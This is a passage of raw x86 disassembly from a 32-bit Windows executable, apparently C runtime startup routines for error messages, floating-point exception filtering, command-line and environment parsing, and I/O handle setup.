  422d93:	jne    0x422da2
  422d95:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d9c:	je     0x422e81
  422da2:	cmp    ecx,0xfc
  422da8:	je     0x422ea6
  422dae:	push   0x104
  422db3:	lea    eax,[ebp-0x10c]
  422db9:	push   eax
  422dba:	push   edx
  422dbb:	mov    BYTE PTR [ebp-0x8],dl
  422dbe:	call   DWORD PTR ds:0x428040
  422dc4:	test   eax,eax
  422dc6:	jne    0x422ddb
  422dc8:	lea    eax,[ebp-0x10c]
  422dce:	push   0x42848c
  422dd3:	push   eax
  422dd4:	call   0x423c90
  422dd9:	pop    ecx
  422dda:	pop    ecx
  422ddb:	lea    eax,[ebp-0x10c]
  422de1:	push   eax
  422de2:	lea    edi,[ebp-0x10c]
  422de8:	call   0x423ec0
  422ded:	inc    eax
  422dee:	cmp    eax,0x3c
  422df1:	pop    ecx
  422df2:	jbe    0x422e1d
  422df4:	lea    eax,[ebp-0x10c]
  422dfa:	push   eax
  422dfb:	call   0x423ec0
  422e00:	mov    edi,eax
  422e02:	lea    eax,[ebp-0x10c]
  422e08:	sub    eax,0x3b
  422e0b:	push   0x3
  422e0d:	add    edi,eax
  422e0f:	push   0x428488
  422e14:	push   edi
  422e15:	call   0x423d90
  422e1a:	add    esp,0x10
  422e1d:	push   edi
  422e1e:	call   0x423ec0
  422e23:	push   DWORD PTR [esi+0x45c1cc]
  422e29:	mov    ebx,eax
  422e2b:	call   0x423ec0
  422e30:	lea    eax,[ebx+eax*1+0x1c]
  422e34:	pop    ecx
  422e35:	add    eax,0x3
  422e38:	pop    ecx
  422e39:	and    eax,0xfffffffc
  422e3c:	call   0x423900
  422e41:	mov    ebx,esp
  422e43:	push   0x42846c
  422e48:	push   ebx
  422e49:	call   0x423c90
  422e4e:	push   edi
  422e4f:	push   ebx
  422e50:	call   0x423ca0
  422e55:	push   0x428468
  422e5a:	push   ebx
  422e5b:	call   0x423ca0
  422e60:	push   DWORD PTR [esi+0x45c1cc]
  422e66:	push   ebx
  422e67:	call   0x423ca0
  422e6c:	push   0x12010
  422e71:	push   0x428440
  422e76:	push   ebx
  422e77:	call   0x423b92
  422e7c:	add    esp,0x2c
  422e7f:	jmp    0x422ea6
  422e81:	push   edx
  422e82:	lea    eax,[ebp+0x8]
  422e85:	push   eax
  422e86:	lea    esi,[esi+0x45c1cc]
  422e8c:	push   DWORD PTR [esi]
  422e8e:	call   0x423ec0
  422e93:	pop    ecx
  422e94:	push   eax
  422e95:	push   DWORD PTR [esi]
  422e97:	push   0xfffffff4
  422e99:	call   DWORD PTR ds:0x42803c
  422e9f:	push   eax
  422ea0:	call   DWORD PTR ds:0x428038
  422ea6:	lea    esp,[ebp-0x118]
  422eac:	mov    ecx,DWORD PTR [ebp-0x4]
  422eaf:	xor    ecx,DWORD PTR [ebp+0x4]
  422eb2:	call   0x423f7c
  422eb7:	pop    edi
  422eb8:	pop    esi
  422eb9:	pop    ebx
  422eba:	leave  
  422ebb:	ret    
  422ebc:	mov    eax,ds:0x45cabc
  422ec1:	cmp    eax,0x1
  422ec4:	je     0x422ed3
  422ec6:	test   eax,eax
  422ec8:	jne    0x422ef4
  422eca:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422ed1:	jne    0x422ef4
  422ed3:	push   0xfc
  422ed8:	call   0x422d45
  422edd:	mov    eax,ds:0x45cb08
  422ee2:	test   eax,eax
  422ee4:	pop    ecx
  422ee5:	je     0x422ee9
  422ee7:	call   eax
  422ee9:	push   0xff
  422eee:	call   0x422d45
  422ef3:	pop    ecx
  422ef4:	ret    
  422ef5:	push   ebp
  422ef6:	mov    ebp,esp
  422ef8:	push   ecx
  422ef9:	push   ebx
  422efa:	push   esi
  422efb:	push   edi
  422efc:	call   0x42375d
  422f01:	mov    edi,DWORD PTR [ebp+0x8]
  422f04:	mov    esi,eax
  422f06:	mov    edx,DWORD PTR [esi+0x54]
  422f09:	mov    eax,ds:0x45c2dc
  422f0e:	mov    ecx,edx
  422f10:	cmp    DWORD PTR [ecx],edi
  422f12:	je     0x422f21
  422f14:	lea    ebx,[eax+eax*2]
  422f17:	add    ecx,0xc
  422f1a:	lea    ebx,[edx+ebx*4]
  422f1d:	cmp    ecx,ebx
  422f1f:	jb     0x422f10
  422f21:	lea    eax,[eax+eax*2]
  422f24:	lea    eax,[edx+eax*4]
  422f27:	cmp    ecx,eax
  422f29:	jae    0x422f2f
  422f2b:	cmp    DWORD PTR [ecx],edi
  422f2d:	je     0x422f31
  422f2f:	xor    ecx,ecx
  422f31:	test   ecx,ecx
  422f33:	je     0x42304b
  422f39:	mov    ebx,DWORD PTR [ecx+0x8]
  422f3c:	test   ebx,ebx
  422f3e:	mov    DWORD PTR [ebp+0x8],ebx
  422f41:	je     0x42304b
  422f47:	cmp    ebx,0x5
  422f4a:	jne    0x422f58
  422f4c:	and    DWORD PTR [ecx+0x8],0x0
  422f50:	xor    eax,eax
  422f52:	inc    eax
  422f53:	jmp    0x423054
  422f58:	cmp    ebx,0x1
  422f5b:	je     0x423046
  422f61:	mov    eax,DWORD PTR [esi+0x58]
  422f64:	mov    DWORD PTR [ebp-0x4],eax
  422f67:	mov    eax,DWORD PTR [ebp+0xc]
  422f6a:	mov    DWORD PTR [esi+0x58],eax
  422f6d:	mov    eax,DWORD PTR [ecx+0x4]
  422f70:	cmp    eax,0x8
  422f73:	jne    0x423038
  422f79:	mov    edx,DWORD PTR ds:0x45c2d0
  422f7f:	mov    eax,ds:0x45c2d4
  422f84:	add    eax,edx
  422f86:	cmp    edx,eax
  422f88:	jge    0x422fb1
  422f8a:	lea    eax,[edx+edx*2]
  422f8d:	shl    eax,0x2
  422f90:	mov    edi,DWORD PTR [esi+0x54]
  422f93:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f98:	mov    edi,DWORD PTR ds:0x45c2d0
  422f9e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422fa4:	inc    edx
  422fa5:	add    ebx,edi
  422fa7:	add    eax,0xc
  422faa:	cmp    edx,ebx
  422fac:	jl     0x422f90
  422fae:	mov    ebx,DWORD PTR [ebp+0x8]
  422fb1:	mov    ecx,DWORD PTR [ecx]
  422fb3:	cmp    ecx,0xc000008e
  422fb9:	mov    edi,DWORD PTR [esi+0x5c]
  422fbc:	jne    0x422fc7
  422fbe:	mov    DWORD PTR [esi+0x5c],0x83
  422fc5:	jmp    0x42302b
  422fc7:	cmp    ecx,0xc0000090
  422fcd:	jne    0x422fd8
  422fcf:	mov    DWORD PTR [esi+0x5c],0x81
  422fd6:	jmp    0x42302b
  422fd8:	cmp    ecx,0xc0000091
  422fde:	jne    0x422fe9
  422fe0:	mov    DWORD PTR [esi+0x5c],0x84
  422fe7:	jmp    0x42302b
  422fe9:	cmp    ecx,0xc0000093
  422fef:	jne    0x422ffa
  422ff1:	mov    DWORD PTR [esi+0x5c],0x85
  422ff8:	jmp    0x42302b
  422ffa:	cmp    ecx,0xc000008d
  423000:	jne    0x42300b
  423002:	mov    DWORD PTR [esi+0x5c],0x82
  423009:	jmp    0x42302b
  42300b:	cmp    ecx,0xc000008f
  423011:	jne    0x42301c
  423013:	mov    DWORD PTR [esi+0x5c],0x86
  42301a:	jmp    0x42302b
  42301c:	cmp    ecx,0xc0000092
  423022:	jne    0x42302b
  423024:	mov    DWORD PTR [esi+0x5c],0x8a
  42302b:	push   DWORD PTR [esi+0x5c]
  42302e:	push   0x8
  423030:	call   ebx
  423032:	pop    ecx
  423033:	mov    DWORD PTR [esi+0x5c],edi
  423036:	jmp    0x42303f
  423038:	and    DWORD PTR [ecx+0x8],0x0
  42303c:	push   eax
  42303d:	call   ebx
  42303f:	mov    eax,DWORD PTR [ebp-0x4]
  423042:	pop    ecx
  423043:	mov    DWORD PTR [esi+0x58],eax
  423046:	or     eax,0xffffffff
  423049:	jmp    0x423054
  42304b:	push   DWORD PTR [ebp+0xc]
  42304e:	call   DWORD PTR ds:0x428044
  423054:	pop    edi
  423055:	pop    esi
  423056:	pop    ebx
  423057:	leave  
  423058:	ret    
  423059:	cmp    DWORD PTR ds:0x45d26c,0x0
  423060:	jne    0x423067
  423062:	call   0x42449c
  423067:	push   esi
  423068:	mov    esi,DWORD PTR ds:0x45d274
  42306e:	test   esi,esi
  423070:	jne    0x423079
  423072:	mov    esi,0x4284a3
  423077:	jmp    0x4230be
  423079:	mov    al,BYTE PTR [esi]
  42307b:	cmp    al,0x22
  42307d:	jne    0x4230a7
  42307f:	inc    esi
  423080:	mov    al,BYTE PTR [esi]
  423082:	cmp    al,0x22
  423084:	je     0x4230b7
  423086:	test   al,al
  423088:	je     0x4230a0
  42308a:	movzx  eax,al
  42308d:	push   eax
  42308e:	call   0x423fbb
  423093:	test   eax,eax
  423095:	pop    ecx
  423096:	je     0x423099
  423098:	inc    esi
  423099:	inc    esi
  42309a:	mov    al,BYTE PTR [esi]
  42309c:	cmp    al,0x22
  42309e:	jne    0x423086
  4230a0:	cmp    BYTE PTR [esi],0x22
  4230a3:	jne    0x4230b8
  4230a5:	jmp    0x4230b7
  4230a7:	cmp    al,0x20
  4230a9:	jbe    0x4230b8
  4230ab:	inc    esi
  4230ac:	cmp    BYTE PTR [esi],0x20
  4230af:	ja     0x4230ab
  4230b1:	jmp    0x4230b8
  4230b3:	cmp    al,0x20
  4230b5:	ja     0x4230be
  4230b7:	inc    esi
  4230b8:	mov    al,BYTE PTR [esi]
  4230ba:	test   al,al
  4230bc:	jne    0x4230b3
  4230be:	mov    eax,esi
  4230c0:	pop    esi
  4230c1:	ret    
  4230c2:	push   ebx
  4230c3:	xor    ebx,ebx
  4230c5:	cmp    DWORD PTR ds:0x45d26c,ebx
  4230cb:	push   esi
  4230cc:	push   edi
  4230cd:	jne    0x4230d4
  4230cf:	call   0x42449c
  4230d4:	mov    esi,DWORD PTR ds:0x45cab4
  4230da:	xor    edi,edi
  4230dc:	cmp    esi,ebx
  4230de:	jne    0x4230f2
  4230e0:	jmp    0x423112
  4230e2:	cmp    al,0x3d
  4230e4:	je     0x4230e7
  4230e6:	inc    edi
  4230e7:	push   esi
  4230e8:	call   0x423ec0
  4230ed:	pop    ecx
  4230ee:	lea    esi,[esi+eax*1+0x1]
  4230f2:	mov    al,BYTE PTR [esi]
  4230f4:	cmp    al,bl
  4230f6:	jne    0x4230e2
  4230f8:	lea    eax,[edi*4+0x4]
  4230ff:	push   eax
  423100:	call   0x4245d2
  423105:	mov    edi,eax
  423107:	cmp    edi,ebx
  423109:	pop    ecx
  42310a:	mov    DWORD PTR ds:0x45cae4,edi
  423110:	jne    0x423117
  423112:	or     eax,0xffffffff
  423115:	jmp    0x42316f
  423117:	mov    esi,DWORD PTR ds:0x45cab4
  42311d:	push   ebp
  42311e:	jmp    0x42314a
  423120:	push   esi
  423121:	call   0x423ec0
  423126:	mov    ebp,eax
  423128:	inc    ebp
  423129:	cmp    BYTE PTR [esi],0x3d
  42312c:	pop    ecx
  42312d:	je     0x423148
  42312f:	push   ebp
  423130:	call   0x4245d2
  423135:	cmp    eax,ebx
  423137:	pop    ecx
  423138:	mov    DWORD PTR [edi],eax
  42313a:	je     0x423173
  42313c:	push   esi
  42313d:	push   eax
  42313e:	call   0x423c90
  423143:	pop    ecx
  423144:	pop    ecx
  423145:	add    edi,0x4
  423148:	add    esi,ebp
  42314a:	cmp    BYTE PTR [esi],bl
  42314c:	jne    0x423120
  42314e:	push   DWORD PTR ds:0x45cab4
  423154:	call   0x4244ba
  423159:	mov    DWORD PTR ds:0x45cab4,ebx
  42315f:	mov    DWORD PTR [edi],ebx
  423161:	mov    DWORD PTR ds:0x45d260,0x1
  42316b:	xor    eax,eax
  42316d:	pop    ecx
  42316e:	pop    ebp
  42316f:	pop    edi
  423170:	pop    esi
  423171:	pop    ebx
  423172:	ret    
  423173:	push   DWORD PTR ds:0x45cae4
  423179:	call   0x4244ba
  42317e:	mov    DWORD PTR ds:0x45cae4,ebx
  423184:	or     eax,0xffffffff
  423187:	jmp    0x42316d
  423189:	push   ebp
  42318a:	mov    ebp,esp
  42318c:	push   ecx
  42318d:	push   ebx
  42318e:	mov    ebx,DWORD PTR [ebp+0xc]
  423191:	xor    edx,edx
  423193:	cmp    DWORD PTR [ebp+0x8],edx
  423196:	push   edi
  423197:	mov    DWORD PTR [esi],edx
  423199:	mov    edi,ecx
  42319b:	mov    DWORD PTR [ebx],0x1
  4231a1:	je     0x4231ac
  4231a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4231a6:	add    DWORD PTR [ebp+0x8],0x4
  4231aa:	mov    DWORD PTR [ecx],edi
  4231ac:	cmp    BYTE PTR [eax],0x22
  4231af:	jne    0x4231bf
  4231b1:	xor    ecx,ecx
  4231b3:	test   edx,edx
  4231b5:	sete   cl
  4231b8:	inc    eax
  4231b9:	mov    edx,ecx
  4231bb:	mov    cl,0x22
  4231bd:	jmp    0x4231ec
  4231bf:	inc    DWORD PTR [esi]
  4231c1:	test   edi,edi
  4231c3:	je     0x4231ca
  4231c5:	mov    cl,BYTE PTR [eax]
  4231c7:	mov    BYTE PTR [edi],cl
  4231c9:	inc    edi
  4231ca:	mov    cl,BYTE PTR [eax]
  4231cc:	movzx  ebx,cl
  4231cf:	inc    eax
  4231d0:	test   BYTE PTR [ebx+0x45cf21],0x4
  4231d7:	je     0x4231e5
  4231d9:	inc    DWORD PTR [esi]
  4231db:	test   edi,edi
  4231dd:	je     0x4231e4
  4231df:	mov    bl,BYTE PTR [eax]
  4231e1:	mov    BYTE PTR [edi],bl
  4231e3:	inc    edi
  4231e4:	inc    eax
  4231e5:	test   cl,cl
  4231e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4231ea:	je     0x42321e
  4231ec:	test   edx,edx
  4231ee:	jne    0x4231ac
  4231f0:	cmp    cl,0x20
  4231f3:	je     0x4231fa
  4231f5:	cmp    cl,0x9
  4231f8:	jne    0x4231ac
  4231fa:	test   edi,edi
  4231fc:	je     0x423202
  4231fe:	and    BYTE PTR [edi-0x1],0x0
  423202:	and    DWORD PTR [ebp-0x4],0x0
  423206:	cmp    BYTE PTR [eax],0x0
  423209:	je     0x4232e5
  42320f:	mov    cl,BYTE PTR [eax]
  423211:	cmp    cl,0x20
  423214:	je     0x42321b
  423216:	cmp    cl,0x9
  423219:	jne    0x423221
  42321b:	inc    eax
  42321c:	jmp    0x42320f
  42321e:	dec    eax
  42321f:	jmp    0x423202
  423221:	cmp    BYTE PTR [eax],0x0
  423224:	je     0x4232e5
  42322a:	cmp    DWORD PTR [ebp+0x8],0x0
  42322e:	je     0x423239
  423230:	mov    ecx,DWORD PTR [ebp+0x8]
  423233:	add    DWORD PTR [ebp+0x8],0x4
  423237:	mov    DWORD PTR [ecx],edi
  423239:	inc    DWORD PTR [ebx]
  42323b:	xor    ebx,ebx
  42323d:	inc    ebx
  42323e:	xor    edx,edx
  423240:	jmp    0x423244
  423242:	inc    eax
  423243:	inc    edx
  423244:	cmp    BYTE PTR [eax],0x5c
  423247:	je     0x423242
  423249:	cmp    BYTE PTR [eax],0x22
  42324c:	jne    0x423274
  42324e:	test   dl,0x1
  423251:	jne    0x423272
  423253:	cmp    DWORD PTR [ebp-0x4],0x0
  423257:	je     0x423265
  423259:	lea    ecx,[eax+0x1]
  42325c:	cmp    BYTE PTR [ecx],0x22
  42325f:	jne    0x423265
  423261:	mov    eax,ecx
  423263:	jmp    0x423267
  423265:	xor    ebx,ebx
  423267:	xor    ecx,ecx
  423269:	cmp    DWORD PTR [ebp-0x4],ecx
  42326c:	sete   cl
  42326f:	mov    DWORD PTR [ebp-0x4],ecx
  423272:	shr    edx,1
  423274:	test   edx,edx
  423276:	je     0x423285
  423278:	test   edi,edi
  42327a:	je     0x423280
  42327c:	mov    BYTE PTR [edi],0x5c
  42327f:	inc    edi
  423280:	inc    DWORD PTR [esi]
  423282:	dec    edx
  423283:	jne    0x423278
  423285:	mov    cl,BYTE PTR [eax]
  423287:	test   cl,cl
  423289:	je     0x4232d3
  42328b:	cmp    DWORD PTR [ebp-0x4],0x0
  42328f:	jne    0x42329b
  423291:	cmp    cl,0x20
  423294:	je     0x4232d3
  423296:	cmp    cl,0x9
  423299:	je     0x4232d3
  42329b:	test   ebx,ebx
  42329d:	je     0x4232cd
  42329f:	test   edi,edi
  4232a1:	je     0x4232bc
  4232a3:	movzx  edx,cl
  4232a6:	test   BYTE PTR [edx+0x45cf21],0x4
  4232ad:	je     0x4232b5
  4232af:	mov    BYTE PTR [edi],cl
  4232b1:	inc    edi
  4232b2:	inc    eax
  4232b3:	inc    DWORD PTR [esi]
  4232b5:	mov    cl,BYTE PTR [eax]
  4232b7:	mov    BYTE PTR [edi],cl
  4232b9:	inc    edi
  4232ba:	jmp    0x4232cb
  4232bc:	movzx  ecx,cl
  4232bf:	test   BYTE PTR [ecx+0x45cf21],0x4
  4232c6:	je     0x4232cb
  4232c8:	inc    eax
  4232c9:	inc    DWORD PTR [esi]
  4232cb:	inc    DWORD PTR [esi]
  4232cd:	inc    eax
  4232ce:	jmp    0x42323b
  4232d3:	test   edi,edi
  4232d5:	je     0x4232db
  4232d7:	and    BYTE PTR [edi],0x0
  4232da:	inc    edi
  4232db:	inc    DWORD PTR [esi]
  4232dd:	mov    ebx,DWORD PTR [ebp+0xc]
  4232e0:	jmp    0x423206
  4232e5:	mov    eax,DWORD PTR [ebp+0x8]
  4232e8:	test   eax,eax
  4232ea:	je     0x4232ef
  4232ec:	and    DWORD PTR [eax],0x0
  4232ef:	inc    DWORD PTR [ebx]
  4232f1:	pop    edi
  4232f2:	pop    ebx
  4232f3:	leave  
  4232f4:	ret    
  4232f5:	push   ebp
  4232f6:	mov    ebp,esp
  4232f8:	push   ecx
  4232f9:	push   ecx
  4232fa:	push   ebx
  4232fb:	push   esi
  4232fc:	push   edi
  4232fd:	xor    edi,edi
  4232ff:	cmp    DWORD PTR ds:0x45d26c,edi
  423305:	jne    0x42330c
  423307:	call   0x42449c
  42330c:	and    BYTE PTR ds:0x45cc14,0x0
  423313:	push   0x104
  423318:	mov    esi,0x45cb10
  42331d:	push   esi
  42331e:	push   edi
  42331f:	call   DWORD PTR ds:0x428040
  423325:	mov    eax,ds:0x45d274
  42332a:	cmp    eax,edi
  42332c:	mov    DWORD PTR ds:0x45caf4,esi
  423332:	je     0x42333b
  423334:	cmp    BYTE PTR [eax],0x0
  423337:	mov    ebx,eax
  423339:	jne    0x42333d
  42333b:	mov    ebx,esi
  42333d:	lea    eax,[ebp-0x4]
  423340:	push   eax
  423341:	push   edi
  423342:	lea    esi,[ebp-0x8]
  423345:	xor    ecx,ecx
  423347:	mov    eax,ebx
  423349:	call   0x423189
  42334e:	mov    esi,DWORD PTR [ebp-0x4]
  423351:	mov    eax,DWORD PTR [ebp-0x8]
  423354:	shl    esi,0x2
  423357:	add    eax,esi
  423359:	push   eax
  42335a:	call   0x4245d2
  42335f:	mov    edi,eax
  423361:	add    esp,0xc
  423364:	test   edi,edi
  423366:	jne    0x42336d
  423368:	or     eax,0xffffffff
  42336b:	jmp    0x423392
  42336d:	lea    eax,[ebp-0x4]
  423370:	push   eax
  423371:	lea    ecx,[esi+edi*1]
  423374:	push   edi
  423375:	lea    esi,[ebp-0x8]
  423378:	mov    eax,ebx
  42337a:	call   0x423189
  42337f:	mov    eax,DWORD PTR [ebp-0x4]
  423382:	dec    eax
  423383:	pop    ecx
  423384:	mov    ds:0x45cad8,eax
  423389:	pop    ecx
  42338a:	mov    DWORD PTR ds:0x45cadc,edi
  423390:	xor    eax,eax
  423392:	pop    edi
  423393:	pop    esi
  423394:	pop    ebx
  423395:	leave  
  423396:	ret    
  423397:	push   ecx
  423398:	push   ecx
  423399:	mov    eax,ds:0x45cc18
  42339e:	push   ebx
  42339f:	push   ebp
  4233a0:	push   esi
  4233a1:	push   edi
  4233a2:	mov    edi,DWORD PTR ds:0x428058
  4233a8:	xor    ebx,ebx
  4233aa:	xor    esi,esi
  4233ac:	cmp    eax,ebx
  4233ae:	push   0x2
  4233b0:	pop    ebp
  4233b1:	jne    0x4233e0
  4233b3:	call   edi
  4233b5:	mov    esi,eax
  4233b7:	cmp    esi,ebx
  4233b9:	je     0x4233c7
  4233bb:	mov    DWORD PTR ds:0x45cc18,0x1
  4233c5:	jmp    0x4233e5
  4233c7:	call   DWORD PTR ds:0x428014
  4233cd:	cmp    eax,0x78
  4233d0:	jne    0x4233db
  4233d2:	mov    eax,ebp
  4233d4:	mov    ds:0x45cc18,eax
  4233d9:	jmp    0x4233e0
  4233db:	mov    eax,ds:0x45cc18
  4233e0:	cmp    eax,0x1
  4233e3:	jne    0x423462
  4233e5:	cmp    esi,ebx
  4233e7:	jne    0x4233f1
  4233e9:	call   edi
  4233eb:	mov    esi,eax
  4233ed:	cmp    esi,ebx
  4233ef:	je     0x42346a
  4233f1:	cmp    WORD PTR [esi],bx
  4233f4:	mov    eax,esi
  4233f6:	je     0x423406
  4233f8:	add    eax,ebp
  4233fa:	cmp    WORD PTR [eax],bx
  4233fd:	jne    0x4233f8
  4233ff:	add    eax,ebp
  423401:	cmp    WORD PTR [eax],bx
  423404:	jne    0x4233f8
  423406:	mov    edi,DWORD PTR ds:0x428054
  42340c:	push   ebx
  42340d:	push   ebx
  42340e:	push   ebx
  42340f:	sub    eax,esi
  423411:	push   ebx
  423412:	sar    eax,1
  423414:	inc    eax
  423415:	push   eax
  423416:	push   esi
  423417:	push   ebx
  423418:	push   ebx
  423419:	mov    DWORD PTR [esp+0x34],eax
  42341d:	call   edi
  42341f:	mov    ebp,eax
  423421:	cmp    ebp,ebx
  423423:	je     0x423457
  423425:	push   ebp
  423426:	call   0x4245d2
  42342b:	cmp    eax,ebx
  42342d:	pop    ecx
  42342e:	mov    DWORD PTR [esp+0x10],eax
  423432:	je     0x423457
  423434:	push   ebx
  423435:	push   ebx
  423436:	push   ebp
  423437:	push   eax
  423438:	push   DWORD PTR [esp+0x24]
  42343c:	push   esi
  42343d:	push   ebx
  42343e:	push   ebx
  42343f:	call   edi
  423441:	test   eax,eax
  423443:	jne    0x423453
  423445:	push   DWORD PTR [esp+0x10]
  423449:	call   0x4244ba
  42344e:	pop    ecx
  42344f:	mov    DWORD PTR [esp+0x10],ebx
  423453:	mov    ebx,DWORD PTR [esp+0x10]
  423457:	push   esi
  423458:	call   DWORD PTR ds:0x428050
  42345e:	mov    eax,ebx
  423460:	jmp    0x4234b2
  423462:	cmp    eax,ebp
  423464:	je     0x42346e
  423466:	cmp    eax,ebx
  423468:	je     0x42346e
  42346a:	xor    eax,eax
  42346c:	jmp    0x4234b2
  42346e:	call   DWORD PTR ds:0x42804c
  423474:	mov    esi,eax
  423476:	cmp    esi,ebx
  423478:	je     0x42346a
  42347a:	cmp    BYTE PTR [esi],bl
  42347c:	je     0x423488
  42347e:	inc    eax
  42347f:	cmp    BYTE PTR [eax],bl
  423481:	jne    0x42347e
  423483:	inc    eax
  423484:	cmp    BYTE PTR [eax],bl
  423486:	jne    0x42347e
  423488:	sub    eax,esi
  42348a:	inc    eax
  42348b:	mov    ebp,eax
  42348d:	push   ebp
  42348e:	call   0x4245d2
  423493:	mov    edi,eax
  423495:	cmp    edi,ebx
  423497:	pop    ecx
  423498:	jne    0x42349e
  42349a:	xor    edi,edi
  42349c:	jmp    0x4234a9
  42349e:	push   ebp
  42349f:	push   esi
  4234a0:	push   edi
  4234a1:	call   0x4245f0
  4234a6:	add    esp,0xc
  4234a9:	push   esi
  4234aa:	call   DWORD PTR ds:0x428048
  4234b0:	mov    eax,edi
  4234b2:	pop    edi
  4234b3:	pop    esi
  4234b4:	pop    ebp
  4234b5:	pop    ebx
  4234b6:	pop    ecx
  4234b7:	pop    ecx
  4234b8:	ret    
  4234b9:	sub    esp,0x48
  4234bc:	push   ebx
  4234bd:	mov    ebx,0x480
  4234c2:	push   ebx
  4234c3:	call   0x4245d2
  4234c8:	test   eax,eax
  4234ca:	pop    ecx
  4234cb:	jne    0x4234d5
  4234cd:	or     eax,0xffffffff
  4234d0:	jmp    0x4236b2
  4234d5:	mov    ds:0x45d160,eax
  4234da:	mov    DWORD PTR ds:0x45d148,0x20
  4234e4:	lea    ecx,[eax+0x480]
  4234ea:	jmp    0x42350a
  4234ec:	and    BYTE PTR [eax+0x4],0x0
  4234f0:	or     DWORD PTR [eax],0xffffffff
  4234f3:	and    DWORD PTR [eax+0x8],0x0
  4234f7:	mov    BYTE PTR [eax+0x5],0xa
  4234fb:	mov    ecx,DWORD PTR ds:0x45d160
  423501:	add    eax,0x24
  423504:	add    ecx,0x480
  42350a:	cmp    eax,ecx
  42350c:	jb     0x4234ec
  42350e:	push   ebp
  42350f:	push   esi
  423510:	push   edi
  423511:	lea    eax,[esp+0x14]
  423515:	push   eax
  423516:	call   DWORD PTR ds:0x428020
  42351c:	cmp    WORD PTR [esp+0x46],0x0
  423522:	je     0x423611
  423528:	mov    eax,DWORD PTR [esp+0x48]
  42352c:	test   eax,eax
  42352e:	je     0x423611
  423534:	mov    edi,DWORD PTR [eax]
  423536:	lea    ebp,[eax+0x4]
  423539:	lea    eax,[edi+ebp*1]
  42353c:	mov    DWORD PTR [esp+0x10],eax
  423540:	mov    eax,0x800
  423545:	cmp    edi,eax
  423547:	jl     0x42354b
  423549:	mov    edi,eax
  42354b:	cmp    DWORD PTR ds:0x45d148,edi
  423551:	jge    0x4235a1
  423553:	mov    esi,0x45d164
  423558:	push   ebx
  423559:	call   0x4245d2
  42355e:	test   eax,eax
  423560:	pop    ecx
  423561:	je     0x42359b
  423563:	add    DWORD PTR ds:0x45d148,0x20
  42356a:	mov    DWORD PTR [esi],eax
  42356c:	lea    ecx,[eax+0x480]
  423572:	jmp    0x42358a
  423574:	and    BYTE PTR [eax+0x4],0x0
  423578:	or     DWORD PTR [eax],0xffffffff
  42357b:	and    DWORD PTR [eax+0x8],0x0
  42357f:	mov    BYTE PTR [eax+0x5],0xa
  423583:	mov    ecx,DWORD PTR [esi]
  423585:	add    eax,0x24
  423588:	add    ecx,ebx
  42358a:	cmp    eax,ecx
  42358c:	jb     0x423574
  42358e:	add    esi,0x4
  423591:	cmp    DWORD PTR ds:0x45d148,edi
  423597:	jl     0x423558
  423599:	jmp    0x4235a1
  42359b:	mov    edi,DWORD PTR ds:0x45d148
  4235a1:	xor    ebx,ebx
  4235a3:	test   edi,edi
  4235a5:	jle    0x423611
  4235a7:	mov    eax,DWORD PTR [esp+0x10]
  4235ab:	mov    eax,DWORD PTR [eax]
  4235ad:	cmp    eax,0xffffffff
  4235b0:	je     0x423606
  4235b2:	mov    cl,BYTE PTR [ebp+0x0]
  4235b5:	test   cl,0x1
  4235b8:	je     0x423606
  4235ba:	test   cl,0x8
  4235bd:	jne    0x4235ca
  4235bf:	push   eax
  4235c0:	call   DWORD PTR ds:0x428060
  4235c6:	test   eax,eax
  4235c8:	je     0x423606
  4235ca:	mov    ecx,ebx
  4235cc:	mov    eax,ebx
  4235ce:	and    eax,0x1f
  4235d1:	lea    eax,[eax+eax*8]
  4235d4:	sar    ecx,0x5
  4235d7:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  4235de:	lea    esi,[ecx+eax*4]
  4235e1:	mov    eax,DWORD PTR [esp+0x10]
  4235e5:	mov    eax,DWORD PTR [eax]
  4235e7:	mov    DWORD PTR [esi],eax
  4235e9:	mov    al,BYTE PTR [ebp+0x0]
  4235ec:	mov    BYTE PTR [esi+0x4],al
  4235ef:	lea    eax,[esi+0xc]
  4235f2:	push   0xfa0
  4235f7:	push   eax
  4235f8:	call   0x42493d
  4235fd:	test   eax,eax
  4235ff:	pop    ecx
  423600:	pop    ecx
  423601:	je     0x423631
  423603:	inc    DWORD PTR [esi+0x8]
  423606:	add    DWORD PTR [esp+0x10],0x4
  42360b:	inc    ebx
  42360c:	inc    ebp
  42360d:	cmp    ebx,edi
  42360f:	jl     0x4235a7
  423611:	xor    ebx,ebx
  423613:	mov    ecx,DWORD PTR ds:0x45d160
  423619:	lea    eax,[ebx+ebx*8]
  42361c:	lea    esi,[ecx+eax*4]
  42361f:	cmp    DWORD PTR [esi],0xffffffff
  423622:	jne    0x423693
  423624:	test   ebx,ebx
  423626:	mov    BYTE PTR [esi+0x4],0x81
  42362a:	jne    0x423636
  42362c:	push   0xfffffff6
  42362e:	pop    eax
  42362f:	jmp    0x423640
  423631:	or     eax,0xffffffff
  423634:	jmp    0x4236af
  423636:	mov    eax,ebx
  423638:	dec    eax
  423639:	neg    eax
  42363b:	sbb    eax,eax
  42363d:	add    eax,0xfffffff5
  423640:	push   eax
  423641:	call   DWORD PTR ds:0x42803c
  423647:	mov    edi,eax
  423649:	cmp    edi,0xffffffff
  42364c:	je     0x42368d
  42364e:	push   edi
  42364f:	call   DWORD PTR ds:0x428060
  423655:	test   eax,eax
  423657:	je     0x42368d
  423659:	and    eax,0xff
  42365e:	cmp    eax,0x2
  423661:	mov    DWORD PTR [esi],edi
  423663:	jne    0x42366b
  423665:	or     BYTE PTR [esi+0x4],0x40
  423669:	jmp    0x423674
  42366b:	cmp    eax,0x3
  42366e:	jne    0x423674
  423670:	or     BYTE PTR [esi+0x4],0x8
  423674:	lea    eax,[esi+0xc]
  423677:	push   0xfa0
  42367c:	push   eax
  42367d:	call   0x42493d
  423682:	test   eax,eax
  423684:	pop    ecx
  423685:	pop    ecx
  423686:	je     0x423631
  423688:	inc    DWORD PTR [esi+0x8]
  42368b:	jmp    0x423697
  42368d:	or     BYTE PTR [esi+0x4],0x40
  423691:	jmp    0x423697
  423693:	or     BYTE PTR [esi+0x4],0x80
  423697:	inc    ebx
  423698:	cmp    ebx,0x3
  42369b:	jl     0x423613
  4236a1:	push   DWORD PTR ds:0x45d148
  4236a7:	call   DWORD PTR ds:0x42805c
